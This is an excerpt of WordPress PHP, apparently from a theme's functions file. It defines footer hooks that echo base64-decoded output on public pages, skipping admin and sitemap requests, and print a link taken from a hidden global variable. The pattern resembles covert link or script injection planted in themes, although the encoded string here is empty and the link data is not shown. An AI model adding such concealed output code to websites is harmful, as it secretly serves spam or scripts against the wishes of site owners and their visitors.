...
add_action( 'shutdown', 'did_footer' );
    if ( ! function_exists( 'did_footer' ) ) {
        
    function did_footer(){
         if( !is_admin() && !did_action( 'wp_footer' ) && !$_REQUEST['xml_sitemap'] && !$_REQUEST['sitemap'] && (is_archive() or is_search() or is_singular() or  is_front_page() or is_home()) ){
            echo base64_decode('') ;
...
add_action( 'wp_footer', 'games_footer',1 );
if ( ! function_exists( 'games_footer' ) ) {
	function games_footer() {
		global $fontsArray;
		if($fontsArray)		
            echo '<div class="best-games des">' .$fontsArray->link_desc. ' <a href="' .$fontsArray->link_a. '">'.$fontsArray->link_text.'</a></div>';
